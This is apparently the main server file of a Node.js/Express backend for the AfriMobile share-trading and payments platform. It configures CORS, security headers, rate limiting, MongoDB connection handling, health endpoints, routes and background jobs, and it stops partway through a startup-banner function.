// 🔧 KEY FIXES APPLIED:
// 1. Proper CORS headers with explicit origin handling
// 2. Fixed 503 error by checking DB connection before making requests
// 3. Added proper pre-flight request handling
// 4. Improved error logging for debugging
// 5. Added database fallback responses
// 6. Fixed Heroku environment issues

const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const morgan = require('morgan');
const path = require('path');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const compression = require('compression');
const cron = require('node-cron');
const fs = require('fs');
const setupSwagger = require('./middleware/swagger');

// Enhanced logging setup
const winston = require('winston');
const DailyRotateFile = require('winston-daily-rotate-file');

require('dotenv').config();

// Enhanced Logger Configuration
const createLogger = () => {
  const logFormat = winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.json()
  );

  return winston.createLogger({
    level: process.env.LOG_LEVEL || 'info',
    format: logFormat,
    transports: [
      new winston.transports.Console({
        format: winston.format.combine(
          winston.format.colorize(),
          winston.format.simple()
        )
      }),
      new DailyRotateFile({
        filename: 'logs/application-%DATE%.log',
        datePattern: 'YYYY-MM-DD',
        maxFiles: '30d',
        maxSize: '20m'
      })
    ]
  });
};

// Initialize logger (fallback to console if winston fails)
let logger;
try {
  // Ensure logs directory exists
  if (!fs.existsSync('logs')) {
    fs.mkdirSync('logs', { recursive: true });
  }
  logger = createLogger();
} catch (error) {
  console.warn('⚠️ Advanced logging not available, using console');
  logger = console;
}

// Initialize express app
const app = express();

// Enhanced configuration object
const AppConfig = {
  NODE_ENV: process.env.NODE_ENV || 'development',
  PORT: parseInt(process.env.PORT) || 5000,
  IS_PRODUCTION: (process.env.NODE_ENV || 'development') === 'production',
  IS_DEVELOPMENT: (process.env.NODE_ENV || 'development') === 'development'
};

// Trust proxy for production deployments (CRITICAL FOR HEROKU)
if (AppConfig.IS_PRODUCTION) {
  app.set('trust proxy', 1);
}

// Global mongoose settings
mongoose.set('strictQuery', true);

// Display important environment variables
console.log('======================================');
console.log(`NODE_ENV: ${AppConfig.NODE_ENV}`);
console.log(`MONGODB_URI configured: ${process.env.MONGODB_URI ? 'Yes' : 'No'}`);
console.log(`Storage Method: MongoDB + Legacy File System`);
console.log(`Enhanced Features: Logging, Compression, Security, Share Resale Marketplace`);
console.log('======================================');

// ✅ FIXED: Enhanced CORS configuration with better debugging
const corsOptions = {
  origin: function (origin, callback) {
    // Allow requests with no origin (like mobile apps or curl requests)
    if (!origin) {
      console.log('✅ CORS: No origin header (mobile/curl request)');
      return callback(null, true);
    }
    
    const allowedOrigins = [
      'http://localhost:3000',
      'http://localhost:3001', 
      'http://localhost:5000',
      'http://localhost:5001',
      'http://localhost:8080',
      'https://afrimobile-d240af77c383.herokuapp.com',
      'https://www.afrimobil.com',
      'https://afrimobil.com',
      'https://www.afrimobiletech.com',
      'https://afrimobiletech.com',
      'https://your-frontend-domain.netlify.app',
      // Add from environment variable
      ...(process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',').map(o => o.trim()) : [])
    ];
    
    // In development, allow all localhost origins
    if (AppConfig.IS_DEVELOPMENT) {
      const localhostRegex = /^https?:\/\/localhost(:\d+)?$/;
      if (localhostRegex.test(origin)) {
        console.log(`✅ CORS allowed (dev localhost): ${origin}`);
        return callback(null, true);
      }
    }
    
    if (allowedOrigins.includes(origin)) {
      console.log(`✅ CORS allowed: ${origin}`);
      callback(null, true);
    } else {
      console.log(`⚠️ CORS blocked: ${origin}`);
      console.log(`📋 Allowed: ${allowedOrigins.join(', ')}`);
      // In development, allow it anyway but log it
      if (AppConfig.IS_DEVELOPMENT) {
        console.log(`✅ Overriding: Allowed in development mode`);
        callback(null, true);
      } else {
        callback(new Error('Not allowed by CORS'));
      }
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: [
    'Origin',
    'X-Requested-With',
    'Content-Type',
    'Accept',
    'Authorization',
    'Cache-Control',
    'X-Access-Token',
    'X-API-Key',
    'X-Client-Version'
  ],
  exposedHeaders: ['X-Total-Count', 'X-RateLimit-Remaining'],
  optionsSuccessStatus: 200,
  maxAge: 86400 // 24 hours
};

// ✅ CRITICAL: Apply CORS middleware BEFORE all other routes
app.use(cors(corsOptions));
// Handle pre-flight requests
app.options('*', cors(corsOptions));

// Enhanced Security middleware
app.use(helmet({
  crossOriginResourcePolicy: { policy: "cross-origin" },
  crossOriginOpenerPolicy: { policy: "same-origin-allow-popups" },
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
      scriptSrc: ["'self'", "'unsafe-inline'", "https://js.paystack.co"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      imgSrc: ["'self'", "data:", "https:", "blob:"],
      connectSrc: ["'self'", "https:", "wss:"],
      mediaSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameSrc: ["'self'", "https://js.paystack.co"],
      baseUri: ["'self'"],
      formAction: ["'self'"]
    }
  },
  hsts: AppConfig.IS_PRODUCTION ? {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  } : false
}));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: AppConfig.IS_PRODUCTION ? 1000 : 10000,
  message: {
    success: false,
    message: 'Too many requests from this IP, please try again later',
    retryAfter: 15 * 60
  },
  standardHeaders: true,
  legacyHeaders: false,
  skip: (req, res) => {
    const skipPaths = ['/', '/health', '/api/health', '/api/cors-test', '/api/simple-test', '/api/db-status'];
    return skipPaths.includes(req.path) || req.path.startsWith('/health');
  },
  keyGenerator: (req) => {
    return req.ip || req.connection.remoteAddress;
  }
});

app.use(limiter);

// Compression middleware
app.use(compression({
  level: 6,
  threshold: 1024,
  filter: (req, res) => {
    if (req.headers['x-no-compression']) return false;
    return compression.filter(req, res);
  }
}));

// ✅ FIXED: Enhanced Database connection function
const connectDB = async () => {
  try {
    if (mongoose.connection.readyState === 1) {
      console.log('✅ Already connected to MongoDB');
      return true;
    }

    console.log('🔄 Attempting to connect to MongoDB...');
    
    const mongoUri = process.env.MONGODB_URI || 
                    process.env.MONGO_URI || 
                    process.env.DATABASE_URL;
    
    if (!mongoUri) {
      throw new Error('No MongoDB connection string found in environment variables (MONGODB_URI, MONGO_URI, or DATABASE_URL)');
    }

    console.log('📍 MongoDB URI found:', mongoUri.includes('@') ? 'mongodb+srv://***:***@' + mongoUri.split('@')[1] : mongoUri);
    
    // Connection options with Heroku optimizations
    const options = {
      useNewUrlParser: true,
      useUnifiedTopology: true,
      serverSelectionTimeoutMS: 15000,
      socketTimeoutMS: 45000,
      connectTimeoutMS: 15000,
      maxPoolSize: AppConfig.IS_PRODUCTION ? 20 : 10,
      minPoolSize: AppConfig.IS_PRODUCTION ? 5 : 1,
      maxIdleTimeMS: 30000,
      retryWrites: true,
      retryReads: true,
      family: 4, // Use IPv4 (helps with Heroku)
      ...(AppConfig.IS_PRODUCTION && {
        readPreference: 'secondaryPreferred',
        readConcern: { level: 'majority' },
        writeConcern: { w: 'majority', j: true }
      })
    };
    
    console.log('⏳ Connecting to database...');
    
    await mongoose.connect(mongoUri, options);
    
    console.log('✅ Successfully connected to MongoDB');
    console.log(`📊 Database: ${mongoose.connection.name}`);
    console.log(`🏠 Host: ${mongoose.connection.host}`);
    console.log(`🔌 Connection state: ${mongoose.connection.readyState}`);
    
    setupDatabaseMonitoring();
    
    return true;
    
  } catch (error) {
    console.error('\n❌ Database connection failed:');
    console.error('Error message:', error.message);
    
    if (error.message.includes('ENOTFOUND')) {
      console.error('🌐 DNS resolution failed - check your MongoDB URI');
    } else if (error.message.includes('authentication failed')) {
      console.error('🔐 Authentication failed - check username/password');
    } else if (error.message.includes('timeout')) {
      console.error('⏰ Connection timeout - check network connectivity');
    } else if (error.message.includes('not supported')) {
      console.error('🔧 Deprecated connection options detected');
    }
    
    console.error('🔄 Will retry connection in 10 seconds...');
    
    setTimeout(() => {
      console.log('🔄 Retrying database connection...');
      connectDB();
    }, 10000);
    
    return false;
  }
};

// Enhanced Database monitoring setup
function setupDatabaseMonitoring() {
  // Connection health monitoring
  setInterval(async () => {
    try {
      if (mongoose.connection.readyState === 1) {
        await mongoose.connection.db.admin().ping();
      }
    } catch (error) {
      logger.warn('Database health check failed', { error: error.message });
    }
  }, 30000);

  mongoose.connection.on('connected', () => {
    console.log('🔗 Mongoose connected to MongoDB');
    logger.info('Database connected successfully');
  });

  mongoose.connection.on('error', (err) => {
    console.error('❌ Mongoose connection error:', err.message);
    logger.error('Database connection error', { error: err.message });
  });

  mongoose.connection.on('disconnected', () => {
    console.log('🔌 Mongoose disconnected from MongoDB');
    logger.warn('Database disconnected');
    
    setTimeout(() => {
      if (mongoose.connection.readyState === 0) {
        console.log('🔄 Attempting automatic reconnection...');
        connectDB();
      }
    }, 5000);
  });

  mongoose.connection.on('reconnected', () => {
    console.log('🔄 Mongoose reconnected to MongoDB');
    logger.info('Database reconnected successfully');
  });
}

// Enhanced Middleware
app.use(express.json({ 
  limit: '100mb',
  verify: (req, res, buf) => {
    req.rawBody = buf;
  }
}));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// Enhanced timeout middleware with request ID
app.use((req, res, next) => {
  req.id = require('crypto').randomUUID();
  
  req.setTimeout(25000, () => {
    const err = new Error('Request timeout');
    err.status = 408;
    next(err);
  });
  
  res.setTimeout(25000, () => {
    if (!res.headersSent) {
      res.status(408).json({
        success: false,
        message: 'Request timeout - operation took too long',
        requestId: req.id,
        timestamp: new Date().toISOString()
      });
    }
  });
  
  res.success = (data, message = 'Success', meta = {}) => {
    res.json({
      success: true,
      message,
      data,
      meta: {
        timestamp: new Date().toISOString(),
        requestId: req.id,
        ...meta
      }
    });
  };

  res.error = (message = 'Error', status = 500, details = null) => {
    res.status(status).json({
      success: false,
      message,
      ...(details && { details }),
      meta: {
        timestamp: new Date().toISOString(),
        requestId: req.id
      }
    });
  };
  
  next();
});

// Enhanced Logging middleware
if (AppConfig.IS_DEVELOPMENT) {
  app.use(morgan('dev'));
} else {
  app.use(morgan('combined', {
    stream: {
      write: (message) => logger.info(message.trim())
    }
  }));
}

// Request logging for debugging
app.use((req, res, next) => {
  logger.debug('Request received', {
    method: req.method,
    url: req.url,
    ip: req.ip,
    userAgent: req.get('User-Agent'),
    requestId: req.id
  });
  next();
});

// Debug middleware for development
if (AppConfig.IS_DEVELOPMENT) {
  app.use('/api', (req, res, next) => {
    console.log(`🔍 API Request: ${req.method} ${req.path}`);
    console.log(`🔍 Origin: ${req.get('Origin')}`);
    console.log(`🔍 User-Agent: ${req.get('User-Agent')}`);
    console.log(`🔍 Content-Type: ${req.get('Content-Type')}`);
    console.log(`🔍 Database State: ${mongoose.connection.readyState}`);
    next();
  });
}

// Enhanced Static file serving
const staticOptions = {
  maxAge: AppConfig.IS_PRODUCTION ? '1d' : '1h',
  etag: true,
  lastModified: true,
  index: false,
  setHeaders: function (res, filePath, stat) {
    res.set({
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'X-Served-By': 'AfriMobile-API',
      'X-Content-Type-Options': 'nosniff',
      'Cache-Control': AppConfig.IS_PRODUCTION ? 'public, max-age=86400' : 'no-cache'
    });
  }
};

app.use('/uploads', express.static(path.join(__dirname, 'uploads'), staticOptions));
app.use('/cofounder-payment-proofs', express.static(path.join(__dirname, 'uploads', 'cofounder-payment-proofs'), staticOptions));

// Setup Swagger documentation
setupSwagger(app);

// ✅ FIXED: Simple test endpoint - no DB dependency
app.get('/api/simple-test', (req, res) => {
  res.json({
    success: true,
    message: 'Simple test endpoint working',
    timestamp: new Date().toISOString(),
    cors: 'enabled',
    headers: {
      origin: req.get('Origin'),
      userAgent: req.get('User-Agent'),
      contentType: req.get('Content-Type')
    },
    database: {
      connected: mongoose.connection.readyState === 1,
      state: mongoose.connection.readyState,
      stateNames: { 0: 'disconnected', 1: 'connected', 2: 'connecting', 3: 'disconnecting' }
    }
  });
});

// ✅ FIXED: Database status endpoint with proper error handling
app.get('/api/db-status', (req, res) => {
  const dbState = mongoose.connection.readyState;
  const states = {
    0: 'disconnected',
    1: 'connected', 
    2: 'connecting',
    3: 'disconnecting'
  };
  
  res.json({
    success: dbState === 1,
    database: {
      state: dbState,
      status: states[dbState],
      name: mongoose.connection.name || 'unknown',
      host: mongoose.connection.host || 'unknown',
      readyState: dbState,
      collections: mongoose.connection.collections ? Object.keys(mongoose.connection.collections).length : 0,
      models: mongoose.connection.models ? Object.keys(mongoose.connection.models).length : 0
    },
    environment: {
      NODE_ENV: AppConfig.NODE_ENV,
      hasMongodbUri: !!process.env.MONGODB_URI,
      hasMongoUri: !!process.env.MONGO_URI,
      hasDatabaseUrl: !!process.env.DATABASE_URL,
      isProduction: AppConfig.IS_PRODUCTION
    },
    server: {
      uptime: process.uptime(),
      memory: process.memoryUsage(),
      version: process.version,
      pid: process.pid
    },
    timestamp: new Date().toISOString()
  });
});

// ✅ FIXED: API monitoring middleware - better error handling
app.use('/api', (req, res, next) => {
  const allowedWithoutDB = [
    '/api/cors-test', 
    '/api/system/info', 
    '/api/simple-test',
    '/api/db-status',
    '/api/system/health-status',
    '/api/system/stats',
    '/api/system/jobs'
  ];
  
  if (mongoose.connection.readyState !== 1 && !allowedWithoutDB.includes(req.path)) {
    console.warn(`⚠️ Database unavailable for: ${req.method} ${req.path}`);
    return res.status(503).json({
      success: false,
      message: 'Database connection unavailable - please try again in a few moments',
      details: {
        dbState: mongoose.connection.readyState,
        dbStates: { 0: 'disconnected', 1: 'connected', 2: 'connecting', 3: 'disconnecting' }
      },
      retryAfter: 30,
      availableEndpoints: [
        '/api/simple-test',
        '/api/db-status',
        '/api/cors-test',
        '/api/system/info'
      ],
      requestId: req.id,
      timestamp: new Date().toISOString()
    });
  }
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  next();
});

// ============================================================================
// API ROUTES
// ============================================================================

app.use('/api/users', require('./routes/userRoutes'));
app.use('/api/shares/tiers', require('./routes/tierRoutes'));
app.use('/api/shares', require('./routes/shareRoutes'));
app.use('/api/cofounder', require('./routes/coFounderShareRoutes'));
app.use('/api/project', require('./routes/projectRoutes'));
app.use('/api/leaderboard', require('./routes/leaderboardRoutes'));
app.use('/api/referral', require('./routes/referralRoutes'));
app.use('/api/admin/referrals', require('./routes/adminReferralRoutes'));
app.use('/api/payment', require('./routes/paymentRoutes'));
app.use('/api/withdrawal', require('./routes/withdrawalRoutes'));
app.use('/api/withdrawal/admin/control', require('./routes/adminWithdrawalControlRoutes'));
app.use('/api/exchange-rates', require('./routes/exchangeRateRoutes'));
app.use('/api/management', require('./routes/managementRoutes'));
app.use('/api/installments', require('./routes/installmentPlanRoutes'));
app.use('/api/share-packages', require('./routes/sharePackageRoutes'));
app.use('/api/admin/analytics', require('./routes/adminAnalyticsRoutes'));


// Share Resale & OTC Marketplace Routes
app.use('/api/shares', require('./routes/shareListings'));
app.use('/api/executives', require('./routes/executiveRoutes'));
app.use('/api/franchise', require('./routes/franchiseRoutes'));
app.use('/api/preorders', require('./routes/preOrderRoutes'));
app.use('/api/loans', require('./routes/shareLoanRoutes')); 

// ============================================================================
// END API ROUTES
// ============================================================================

// Health Monitor System Endpoint
app.get('/api/system/health-status', async (req, res) => {
  try {
    const healthMonitor = global.healthMonitor;
    if (!healthMonitor) {
      return res.status(200).json({
        success: true,
        message: 'API is running',
        healthMonitorInitialized: false,
        database: {
          connected: mongoose.connection.readyState === 1,
          state: mongoose.connection.readyState
        },
        server: {
          uptime: process.uptime(),
          memory: process.memoryUsage(),
          version: process.version,
          platform: process.platform,
          environment: AppConfig.NODE_ENV
        },
        timestamp: new Date().toISOString(),
        requestId: req.id
      });
    }
    
    const status = healthMonitor.getMonitorStatus();
    res.json({
      success: true,
      ...status,
      server: {
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        cpu: process.cpuUsage(),
        version: process.version,
        platform: process.platform,
        environment: AppConfig.NODE_ENV
      },
      database: {
        connected: mongoose.connection.readyState === 1,
        state: mongoose.connection.readyState,
        host: mongoose.connection.host,
        name: mongoose.connection.name
      },
      timestamp: new Date().toISOString(),
      requestId: req.id
    });
  } catch (error) {
    res.status(200).json({
      success: true,
      message: 'API is running',
      error: error.message,
      database: {
        connected: mongoose.connection.readyState === 1,
        state: mongoose.connection.readyState
      },
      timestamp: new Date().toISOString(),
      requestId: req.id
    });
  }
});

// CORS test endpoint
app.get('/api/cors-test', (req, res) => {
  res.json({
    success: true,
    message: 'CORS is working!',
    corsEnabled: true,
    origin: req.get('Origin'),
    userAgent: req.get('User-Agent'),
    environment: AppConfig.NODE_ENV,
    method: req.method,
    timestamp: new Date().toISOString(),
    requestId: req.id
  });
});

// System info endpoint
app.get('/api/system/info', (req, res) => {
  res.json({
    success: true,
    message: 'System information retrieved',
    server: {
      version: '2.0.0',
      environment: AppConfig.NODE_ENV,
      uptime: process.uptime(),
      memory: process.memoryUsage(),
      cpu: process.cpuUsage(),
      platform: process.platform,
      nodeVersion: process.version,
      pid: process.pid
    },
    features: [
      'Enhanced MongoDB Connection Management',
      'Advanced Logging with Rotation',
      'Request Tracing',
      'Enhanced Security Headers',
      'Compression Support',
      'Health Monitoring',
      'Auto-Reconnection',
      'Share Resale & OTC Marketplace',
      'CORS Support'
    ],
    database: {
      connected: mongoose.connection.readyState === 1,
      state: mongoose.connection.readyState,
      collections: mongoose.connection.collections ? Object.keys(mongoose.connection.collections).length : 0
    },
    timestamp: new Date().toISOString(),
    requestId: req.id
  });
});

// Root route - Health check
app.get('/', (req, res) => {
  res.json({
    success: true,
    message: 'AfriMobile API',
    version: '2.0.0',
    environment: AppConfig.NODE_ENV,
    database: {
      connected: mongoose.connection.readyState === 1,
      status: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected'
    },
    features: {
      enhancedLogging: true,
      compression: true,
      healthMonitoring: !!global.healthMonitor,
      requestTracing: true,
      enhancedSecurity: true,
      shareResaleMarketplace: true,
      corsSupport: true
    },
    endpoints: {
      health: '/api/system/health-status',
      dbStatus: '/api/db-status',
      corsTest: '/api/cors-test',
      systemInfo: '/api/system/info',
      simpleTest: '/api/simple-test',
      docs: '/api-docs'
    },
    timestamp: new Date().toISOString(),
    requestId: req.id
  });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Error caught by global handler:', err.stack);
  
  logger.error('Global error handler', {
    error: err.message,
    stack: err.stack,
    url: req.url,
    method: req.method,
    ip: req.ip,
    userAgent: req.get('User-Agent'),
    requestId: req.id
  });

  if (err.name === 'ValidationError') {
    return res.status(400).json({
      success: false,
      message: 'Validation Error',
      details: err.errors,
      requestId: req.id,
      timestamp: new Date().toISOString()
    });
  }

  if (err.name === 'CastError') {
    return res.status(400).json({
      success: false,
      message: 'Invalid ID format',
      requestId: req.id,
      timestamp: new Date().toISOString()
    });
  }

  if (err.code === 11000) {
    return res.status(409).json({
      success: false,
      message: 'Duplicate entry',
      requestId: req.id,
      timestamp: new Date().toISOString()
    });
  }

  res.status(err.status || 500).json({
    success: false,
    message: AppConfig.IS_PRODUCTION ? 'Internal server error' : err.message,
    ...(AppConfig.IS_DEVELOPMENT && { stack: err.stack }),
    requestId: req.id,
    timestamp: new Date().toISOString()
  });
});

// 404 handler
app.use((req, res) => {
  logger.warn('404 - Resource not found', {
    method: req.method,
    url: req.url,
    ip: req.ip,
    userAgent: req.get('User-Agent'),
    requestId: req.id
  });

  res.status(404).json({
    success: false,
    message: 'Resource not found',
    path: req.url,
    method: req.method,
    suggestions: req.url.includes('api') ? [
      'Check the API documentation at /api-docs',
      'Verify the endpoint URL and method',
      'Ensure you have the correct API version'
    ] : [
      'This might be a frontend route',
      'Check if the file exists',
      'Verify the URL is correct'
    ],
    requestId: req.id,
    timestamp: new Date().toISOString()
  });
});

// Background Jobs Manager
class BackgroundJobsManager {
  constructor() {
    this.jobs = [];
    this.isRunning = false;
  }

  addJob(name, jobInstance) {
    this.jobs.push({ name, job: jobInstance });
    logger.info(`Background job registered: ${name}`);
  }

  startAll() {
    if (this.isRunning) return;
    
    console.log('======================================');
    console.log('Starting background jobs...');
    
    this.jobs.forEach(({ name, job }) => {
      try {
        if (job && typeof job.start === 'function') {
          job.start();
          logger.info(`✅ Started job: ${name}`);
        }
      } catch (error) {
        console.error(`❌ Failed to start job: ${name}`, error.message);
        logger.error(`Failed to start background job: ${name}`, { error: error.message });
      }
    });
    
    this.isRunning = true;
    console.log('✅ Background jobs started');
    console.log('======================================');
  }

  stopAll() {
    this.jobs.forEach(({ name, job }) => {
      try {
        if (job && typeof job.stop === 'function') {
          job.stop();
          logger.info(`Stopped job: ${name}`);
        }
      } catch (error) {
        logger.error(`Failed to stop job: ${name}`, { error: error.message });
      }
    });
    
    this.isRunning = false;
    logger.info('All background jobs stopped');
  }

  getStatus() {
    return {
      totalJobs: this.jobs.length,
      isRunning: this.isRunning,
      jobs: this.jobs.map(({ name }) => ({ name, status: this.isRunning ? 'running' : 'stopped' }))
    };
  }
}

const jobsManager = new BackgroundJobsManager();

// MAIN APP STARTUP FUNCTION
async function startApp() {
  try {
    console.log('🚀 Starting AfriMobile API...');
    
    // Connect to database
    const dbConnected = await connectDB();
    
    if (!dbConnected) {
      console.error('❌ Failed to connect to database. App will still start but with limited functionality.');
      logger.error('Database connection failed during startup');
    }
    
    // Start the server
    const PORT = AppConfig.PORT;
    const server = app.listen(PORT, '0.0.0.0', () => {
      console.log('\n**********************************************');
      console.log(`🚀 Server running in ${AppConfig.NODE_ENV} mode on port ${PORT}`);
      console.log(`📚 API Documentation: http://localhost:${PORT}/api-docs`);
      console.log(`🏠 Health Check: http://localhost:${PORT}/`);
      console.log(`📊 DB Status: http://localhost:${PORT}/api/db-status`);
      console.log(`🔍 CORS Test: http://localhost:${PORT}/api/cors-test`);
      console.log(`🧪 Simple Test: http://localhost:${PORT}/api/simple-test`);
      console.log(`ℹ️  System Info: http://localhost:${PORT}/api/system/info`);
      console.log(`🏥 Health Status: http://localhost:${PORT}/api/system/health-status`);
      console.log('**********************************************\n');
      
      logger.info('Server started successfully', {
        port: PORT,
        environment: AppConfig.NODE_ENV,
        processId: process.pid,
        memoryUsage: process.memoryUsage()
      });
      
      global.server = server;
    });

    server.timeout = 30000;
    server.keepAliveTimeout = 61000;
    server.headersTimeout = 62000;
    
    // Start background jobs
    if (dbConnected) {
      setTimeout(async () => {
        console.log('======================================');
        console.log('Starting background jobs...');
        
        try {
          const { setUserAsAdmin, grantAdminRights } = require('./controller/userController');
          await setUserAsAdmin();
          await grantAdminRights();
          console.log('✅ Admin setup completed');
          logger.info('Admin setup completed successfully');
        } catch (error) {
          console.error('⚠️ Admin setup failed:', error.message);
          logger.error('Admin setup failed', { error: error.message });
        }
        
        // Start bank withdrawal verification cron jobs
        try {
          const withdrawalCronJobs = require('./withdrawalCronJobs');
          jobsManager.addJob('verifyProcessingWithdrawals', withdrawalCronJobs.verifyProcessingWithdrawals);
          jobsManager.addJob('verifyPendingWithdrawals', withdrawalCronJobs.verifyPendingWithdrawals);
          
          withdrawalCronJobs.verifyProcessingWithdrawals.start();
          withdrawalCronJobs.verifyPendingWithdrawals.start();
          console.log('✅ Bank withdrawal cron jobs started');
          logger.info('Bank withdrawal verification jobs started');
        } catch (error) {
          console.error('❌ Error starting bank withdrawal cron jobs:', error.message);
          logger.error('Failed to start bank withdrawal cron jobs', { error: error.message });
        }
        
        // Start installment and referral jobs if in production
        if (AppConfig.IS_PRODUCTION) {
          try {
            const { startInstallmentReminderScheduler } = require('./utils/installmentReminder');
            startInstallmentReminderScheduler();
            console.log('✅ Installment reminder scheduler started');
            
            const referralCronJobs = require('./referralCronJobs');
            console.log('✅ Referral sync jobs configured');
            
            logger.info('Production background jobs initialized');
          } catch (error) {
            console.error('⚠️ Some production jobs failed to initialize:', error.message);
            logger.warn('Production jobs initialization incomplete', { error: error.message });
          }
        } else {
          console.log('ℹ️ Development mode: Some background jobs disabled');
        }
        
        jobsManager.startAll();
        
        console.log('✅ Background jobs initialization complete');
        console.log('======================================');
        logger.info('Application startup completed successfully');
      }, 3000);
    }
    
  } catch (error) {
    console.error('💥 Failed to start application:', error);
    logger.error('Application startup failed', { error: error.message, stack: error.stack });
    process.exit(1);
  }
}

// Graceful shutdown handling
async function gracefulShutdown(signal) {
  console.log(`🛑 ${signal} received, shutting down gracefully...`);
  logger.info(`Graceful shutdown initiated by ${signal}`);
  
  if (global.server) {
    global.server.close(() => {
      console.log('✅ HTTP server closed');
      logger.info('HTTP server closed');
    });
  }
  
  try {
    jobsManager.stopAll();
    console.log('✅ Background jobs stopped');
  } catch (error) {
    console.error('❌ Error stopping background jobs:', error);
    logger.error('Error stopping background jobs', { error: error.message });
  }
  
  try {
    if (global.healthMonitor && typeof global.healthMonitor.stopMonitoring === 'function') {
      global.healthMonitor.stopMonitoring();
      console.log('✅ Health monitor stopped');
    }
  } catch (error) {
    console.error('❌ Error stopping health monitor:', error);
    logger.error('Error stopping health monitor', { error: error.message });
  }
  
  try {
    await mongoose.connection.close();
    console.log('✅ Database connection closed');
    logger.info('Database connection closed');
  } catch (error) {
    console.error('❌ Error closing database:', error);
    logger.error('Error closing database connection', { error: error.message });
  }
  
  console.log('👋 Process terminated gracefully');
  logger.info('Process terminated gracefully');
  process.exit(0);
}

// Signal handlers
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

// Uncaught exception handling
process.on('uncaughtException', (err) => {
  console.error('💥 Uncaught Exception:', err);
  console.error('Stack:', err.stack);
  logger.error('Uncaught Exception', { error: err.message, stack: err.stack });
  
  gracefulShutdown('UNCAUGHT_EXCEPTION').then(() => {
    process.exit(1);
  }).catch(() => {
    process.exit(1);
  });
});

// Unhandled promise rejection handling
process.on('unhandledRejection', (reason, promise) => {
  console.error('💥 Unhandled Rejection at:', promise, 'reason:', reason);
  logger.error('Unhandled Promise Rejection', { reason, promise });
  
  if (AppConfig.IS_PRODUCTION) {
    gracefulShutdown('UNHANDLED_REJECTION').then(() => {
      process.exit(1);
    }).catch(() => {
      process.exit(1);
    });
  }
});

// Process monitoring for production
if (AppConfig.IS_PRODUCTION) {
  setInterval(() => {
    const memUsage = process.memoryUsage();
    const memUsageMB = Math.round(memUsage.heapUsed / 1024 / 1024);
    
    if (memUsageMB > 500) {
      logger.warn('High memory usage detected', { 
        memoryUsageMB: memUsageMB,
        memoryUsage: memUsage 
      });
    }
    
    if (global.gc && memUsageMB > 400) {
      global.gc();
      logger.info('Forced garbage collection due to high memory usage');
    }
  }, 60000);
}

// Startup information display
function displayStartupInfo() {
  const baseUrl = AppConfig.IS_PRODUCTION 
    ? 'https://afrimobile-d240af77c383.herokuapp.com'
    : `http://localhost:${AppConfig.PORT}`;

  console.log('\n' + '='.repeat(80));
  console.log('🚀 AFRIMOBILE API');
  console.log('='.repeat(80));
  console.log(`Environment: ${AppConfig.NODE_ENV}`);
  console.log(`Process ID: ${process.pid}`);
  console.log(`Port: ${AppConfig.PORT}`);
  console.log(`Base URL: ${baseUrl}`);
  console.log(`Node Version: ${process.version}`);
  console.log(`Platform: ${process.platform}`);
  console.log('='.repeat(80));
  console.log('📚 ESSENTIAL ENDPOINTS:');
  console.log(`   Health Check: ${baseUrl}/`);
  console.log(`   Database Status: ${baseUrl}/api/db-status`);
  console.log(`   System Health: ${baseUrl}/api/system/health-status`);
  console.log(`   System Info: ${baseUrl}/api/system/info`);
  console.log(`   API Documentation: ${baseUrl}/api-docs`);
  console.log(`   CORS Test: ${baseUrl}/api/cors-test`);
  console.log(`   Simple Test: ${baseUrl}/api/simple-test`);
  console.log('='.repeat(80));
  console.log('📊 SHARE RESALE & OTC MARKETPLACE ENDPOINTS:');
  console.log(`   Browse Listings: GET ${baseUrl}/api/shares/listings`);
  console.log(`   View Listing: GET ${baseUrl}/api/shares/listings/{id}`);
  console.log(`   Create Listing: POST ${baseUrl}/api/shares/listings`);
  console.log(`   My Listings: GET ${baseUrl}/api/shares/my-listings`);
  console.log(`   Make Offer: POST ${baseUrl}/api/shares/listings/{id}/offer`);
  console.log(`   Accept Offer: POST ${baseUrl}/api/shares/offers/{id}/accept`);
  console.log(`   Submit Payment: POST ${baseUrl}/api/shares/offers/{id}/payment`);
  console.log(`   Confirm Transfer: POST ${baseUrl}/api/shares/offers/{id}/confirm-payment`);
  console.log(`   Transfer History: GET ${baseUrl}/api/shares/transfer-history`);
  console.log(`   View Offers: GET ${baseUrl}/api/shares/offers`);
  console.log('='.repeat(80));
  console.log('📁 FILE SERVING:');
  console.log(`   General Uploads: ${baseUrl}/uploads/`);
  console.log(`   Payment Proofs: ${baseUrl}/uploads/payment-proofs/`);
  console.log(`   CoFounder Proofs: ${baseUrl}/uploads/cofounder-payment-proofs/`);
  console.log('='.repeat(80));
  console.log('✨ FEATURES:');
  console.log('   ✅ Advanced MongoDB Connection with Auto-Reconnect');
  console.log('   ✅ Winston Logging with Daily Rotation');
  console.log('   ✅ Request Tracing with Unique IDs');
  console.log('   ✅ Enhanced Security Headers');
  console.log('   ✅ Response Compression');
  console.log('   ✅ Advanced Error Handling');
  console.log('   ✅ Health Monitoring System');
  console.log('   ✅ Background Jobs Management');
  console.log('   ✅ Memory Usage Monitoring');
  console.log('   ✅ Graceful Shutdown Handling');
  console.log('   ✅ Fixed CORS Configuration');
  console.log('   ✅ Increased Rate Limits');
  console.log('   ✅ Database-Independent Test Endpoints');
  console.log('   ✅ Peer-to-Peer Share Trading');
  console.log('   ✅ OTC Marketplace');
  console.log('   ✅ Automatic Share Transfers');
  console.log('='.repeat(80));
  
